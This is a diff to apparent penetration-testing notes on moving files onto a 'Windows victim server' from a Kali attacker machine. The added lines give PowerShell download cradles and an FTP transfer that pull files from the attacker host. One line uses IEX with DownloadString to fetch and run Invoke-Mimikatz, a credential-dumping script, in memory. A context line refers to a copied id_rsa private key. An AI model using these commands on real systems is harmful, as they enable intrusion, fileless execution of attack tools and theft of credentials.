@@ -9,7 +9,17 @@ Step 4) Get-FileHash C:\Users\Public\id_rsa -Algorithm md5 :- Confirming the fil
 Option 2) Powershell 
 
 This is the example to download the file in to the Windows victim server 
-        (New-Object Net.WebClient).DownloadFile('http://<kali machine:port>/<Target File URL>','<Output File Name>')
-        (New-Object Net.WebClient).DownloadFileAsync('http://<kali machine:port>/<Target File URL','<Output File Name>')
+        (New-Object Net.WebClient).DownloadFile('http://<kali machine:port>/<Target File>','<Output File Name>')
+        (New-Object Net.WebClient).DownloadFileAsync('http://<kali machine:port>/<Target File>','<Output File Name>')
+        Invoke-WebRequest https://<kali machine:port>/<Target File> -OutFile <Output File Name>
 
-Option 3) If we want to run the program 
+Option 3) If we want to run the program without downloading it 
+        IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/credentials/Invoke-Mimikatz.ps1')
+
+
+Option 4) FTP
+
+Step 1) Run the FTP on kali 
+        sudo python3 -m pyftpdlib --port 21
+Step 2) Download the file in windows 
+        (New-Object Net.WebClient).DownloadFile('ftp://<Kali IP address>/file.txt', 'C:\Users\Public\ftp-file.txt')
